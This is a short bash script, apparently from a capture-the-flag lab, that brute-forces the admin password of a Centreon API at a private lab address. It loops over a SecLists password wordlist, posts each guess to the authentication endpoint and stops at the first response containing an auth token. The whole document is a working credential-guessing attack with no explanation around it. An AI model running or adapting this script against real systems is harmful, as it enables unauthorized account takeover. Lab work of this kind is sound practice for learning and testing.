#!/bin/bash

for pass in $(cat /usr/share/seclists/Passwords/twitter-banned.txt);
	do
		curl -s http://10.10.10.157/centreon/api/index.php?action=authenticate -d "username=admin&password=${pass}" | grep authToken && echo $pass && break;
	 done
